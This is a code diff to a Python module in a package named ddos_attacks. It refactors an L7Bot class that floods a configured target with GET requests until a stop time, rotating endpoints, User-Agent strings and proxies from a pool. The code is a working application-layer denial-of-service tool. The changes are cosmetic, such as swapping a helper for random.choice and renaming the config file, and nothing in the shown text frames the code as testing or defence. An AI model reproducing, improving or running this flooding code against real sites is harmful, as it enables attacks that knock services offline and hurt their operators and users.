@@ -1,10 +1,9 @@
-import time
-import asyncio
+import time, asyncio, random
 from pathlib import Path
-from ddos_attacks.utils import random_choice, load_json
+from ddos_attacks.utils import load_json
 from ddos_attacks.proxy.proxy import ProxyPool
 
-ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/ddos.json")
+ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l7ddos.json")
 TARGET = ddos_config["l7"]["TARGET"]
 ENDPOINTS = ddos_config["l7"]["ENDPOINTS"]
 USER_AGENTS = ddos_config["l7"]["USER_AGENTS"]
@@ -18,7 +17,7 @@ class L7Bot:
         self.name = f"bot{num}"
         self.text = None
 
-    async def job(self, session, limiter, stats, stop_time, pool: ProxyPool = None):
+    async def job(self, session, limiter, stats, stop_time, pool: ProxyPool | None):
         while time.time() < stop_time:
             if pool:
                 p = await pool.acquire(timeout=1.0)
@@ -26,10 +25,12 @@ class L7Bot:
                     await asyncio.sleep(0.1)
                     continue
                 proxy_url = p.url
+
             await limiter.acquire()
-            endpoint = random_choice(self.endpoints)
-            headers = {"User-Agent": random_choice(self.user_agents)}
+            endpoint = random.choice(self.endpoints)
+            headers = {"User-Agent": random.choice(self.user_agents)}
             start = time.time()
+
             if pool:
                 try:
                     async with session.get(self.target + endpoint, headers=headers, proxy=proxy_url, timeout=10) as resp:
@@ -44,6 +45,7 @@ class L7Bot:
                 finally:
                     pool.release(p)
                 await asyncio.sleep(0)
+
             else:
                 try:
                     async with session.get(self.target + endpoint, headers=headers, timeout=10) as resp:
